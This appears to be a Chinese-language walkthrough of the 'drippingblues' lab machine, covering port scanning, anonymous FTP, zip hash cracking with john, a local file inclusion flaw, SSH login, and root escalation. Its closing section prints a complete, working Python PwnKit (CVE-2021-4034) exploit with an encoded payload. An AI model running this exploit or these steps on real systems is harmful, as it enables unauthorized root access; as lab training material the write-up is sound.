# drippingblues

## 主机发现

靶机：172.16.170.13

主机：172.16.170.63

## 信息收集

端口扫描

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.170.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9ebbaf6f7da79d65a1b1a1be91cd0428 (RSA)
|   256 a3d3c0b4c5f9c06ce54764fe91c5cdc0 (ECDSA)
|_  256 4c84da5aff04b9b55c5abe21b60e4573 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:C7:EB:72 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

80端口枚举出/robots.txt文件尝试访问

## web收集

![image-20230310100914806](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310100914806.png)

首页内容：关注名称`travisscott & thugger `

![image-20230310102039920](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310102039920.png)打不开网页。

得到信息

robots文件中的/etc/dripispowerful.html无法打开，但是路径存在。

## FTP

空密码登录ftp成功

![image-20230310094713869](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310094713869.png)

解压文件，提示密码错误，使用zip2john提取哈希，在使用john破解

```
john --wordlist=/usr/share/wordlists/rockyou.txt ftp_md5.txt
```

![image-20230310100341197](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310100341197.png)

![image-20230310100634817](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310100634817.png)

得到内容`drip` 

## 漏洞利用

在index.php页面下存在本地文件包含漏洞`?drip=/etc/dripispowerful.html`

password is:imdrippinbiatch

![image-20230310103702889](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310103702889.png)

上面提到存在两个用户travisscott 和 thugger

尝试ssh登录

用户thugger登录成功

![image-20230310104014984](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310104014984.png)

## 提权

查看进程发现了

![image-20230310111952903](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310111952903.png)

> polkit 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。
> Polkit 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。
> Polkit 定义出一系列操作，例如运行 GParted, 并将用户按照群组或用户名进行划分，例如 wheel 群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。

查看有无漏洞

发现

![image-20230310112411014](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310112411014.png)

但是对应的靶机上没有GCC

[Almorabea/Polkit漏洞利用：使用 polkit 进行权限提升 - CVE-2021-3560 (github.com)](https://github.com/Almorabea/Polkit-exploit)

发现py版本，在靶机/home目录下载，执行

这个不行

[CVE-2021-4034/cve2021-4034.py at master · nikaiw/CVE-2021-4034 (github.com)](https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py)

这个最新的漏洞可以

```
#!/usr/bin/env python3

# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys
# hardcoded amd64 lib
from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile

payload = zlib.decompress(
    base64.b64decode(
        """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"""
    )
)
libc = CDLL(find_library("c"))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + "/pwn.so", "wb").write(payload)
os.mkdir(wd + "/gconv/")
open(wd + "/gconv/gconv-modules", "w").write(
    "module  UTF-8//    INTERNAL    ../pwn    2"
)
os.mkdir(wd + "/GCONV_PATH=.")
os.mknod(wd + "/GCONV_PATH=./gconv")
os.chmod(wd + "/GCONV_PATH=.", 0o777)
os.chmod(wd + "/GCONV_PATH=./gconv", 0o777)
os.chmod(wd + "/pwn.so", 0o777)
os.chdir(wd)
cmd = b"/usr/bin/pkexec"
argv = []
envp = [
    b"gconv",
    b"PATH=GCONV_PATH=.",
    b"LC_MESSAGES=en_US.UTF-8",
    b"XAUTHORITY=../gconv",
    b"",
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)
```

![image-20230310114937267](C:\Users\june\AppData\Roaming\Typora\typora-user-images\image-20230310114937267.png)

## 成功提权